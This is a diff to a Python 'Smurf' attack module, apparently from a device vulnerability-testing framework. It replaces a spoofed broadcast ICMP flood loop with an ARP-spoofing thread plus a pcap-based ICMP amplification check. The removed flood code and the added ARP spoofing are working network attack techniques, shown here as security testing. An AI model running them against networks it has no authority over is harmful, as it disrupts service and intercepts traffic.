@@ -3,9 +3,8 @@ from generic_attack import *
 import logging
 log = logging.getLogger(__name__)
 from scapy.all import *
-from re import search
-from subprocess import Popen
-from commands import getoutput
+import threading
+from arp_spoof import ArpSpoof
 
 class Smurf(GenericAttack):
 
@@ -13,54 +12,55 @@ class Smurf(GenericAttack):
         super(Smurf, self).__init__(attackName, attackConfig, deviceConfig)
 
     def initialize(self, result):
+        global arpspoof
+        arpspoof = ArpSpoof("ArpSpoof", self.config, self.device)
         self.running = True
+        arp_status = {}
+        tarp = threading.Thread(target=arpspoof.initialize, args=(arp_status,))
+        tarp.start()
+        time.sleep(5)
+
         target = self.device['ip']
         broadcast_addr = self.device['broadcast_ip']
-        ip_hdr = IP(src=target, dst=broadcast_addr)
-        packet = ip_hdr / ICMP()
+        ip_hdr = IP(dst=target)
+        icmpPacket = ip_hdr / ICMP()
+        initialPacketSize = 0
 
-        while self.running:
-            send(packet)
-            if not self.is_alive():
-                log.info('Host not responding!')
-                result.update({"status": "vulnerable"})
-                return
+        packetCount = self.config['packet_count']
+        for x in range(0, packetCount):
+            send(icmpPacket)
+            time.sleep(1)
+        arpspoof.shutdown()
+        tarp.join()
 
-        result.update({"status": "not"})
+        file_prefix = self.config["file_prefix"]
+        filename = 'results/' + self.device['time'] + '_' + file_prefix + '_cap.pcap'
+        pcap = rdpcap(filename)
+        sessions = pcap.sessions()
+        vulnerable= False
+        for session in sessions:
+            for packet in sessions[session]:
+                try:
+                    if packet['IP'].dst == target and packet['ICMP'].type==8:
+                            initialPacketSize = len(packet)
+
+                    if packet['IP'].src == target and packet['ICMP'].type==0 and ( not initialPacketSize == 0):
+                            result.update({"amplification_factor": len(packet)/initialPacketSize})
+                            vulnerable = True
+                except:
+                    pass
+
+        if vulnerable:
+            result.update({"status": "vulnerable"})
+        else:
+            result.update({"status": "not_vulnerable"})
         return
 
-    def is_alive(self):
-        """Check if the target is alive"""
-        if not self.device['ip'] is None:
-            rval = self.init_app('ping -c 1 -w 1 %s' % \
-                                 self.device['ip'], True)
-            up = search('\d.*? received', rval)
-            if search('0', up.group(0)) is None:
-                return True
-        return False
 
-    def init_app(self, prog, output=True):
-        """inititalize an application
-           PROG is the full command with args
-           OUTPUT true if output should be returned
-           false if output should be dumped to null.  This will
-           return a process handle and is meant for initializing
-           background processes.  Use wisely.
-        """
-        # dump output to null
-        if not output:
-            try:
-                null = open(os.devnull, 'w')
-                proc = Popen(prog, stdout=null, stderr=null)
-            except Exception, j:
-                log.error("Error initializing app: %s" % j)
-                return False
-            return proc
-        # just grab output
-        else:
-            return getoutput(prog)
 
     def shutdown(self):
+        global arpspoof
+        arpspoof.shutdown()
         self.running = False
 
 
